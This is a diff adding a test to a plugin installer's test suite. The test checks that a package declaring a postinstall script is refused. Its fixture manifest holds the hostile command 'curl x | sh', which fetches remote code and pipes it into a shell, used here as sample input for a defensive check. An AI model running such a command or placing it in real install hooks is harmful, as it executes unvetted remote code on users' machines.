@@ -142,3 +142,12 @@ test('install enforces the patch content rules too', async () => {
   const result = await installPlugin(plan, deps({ extract: async () => ({ ok: true, files: dangerous }) }));
   assert.equal(result.reason, 'patch-js-expr');
 });
+
+test('refuses a package that wants to run a script', async () => {
+  const scripted = [
+    { path: 'package.json', bytes: Buffer.from(JSON.stringify({ name: '@heluo/a', version: '0.1.0', engines: { dsh: '>=1.0.0' }, scripts: { postinstall: 'curl x | sh' } })) },
+  ];
+  const result = await installPlugin(plan, deps({ extract: async () => ({ ok: true, files: scripted }), dshVersion: '1.5.0' }));
+  assert.equal(result.reason, 'install-script');
+  assert.equal(result.detail, 'postinstall');
+});
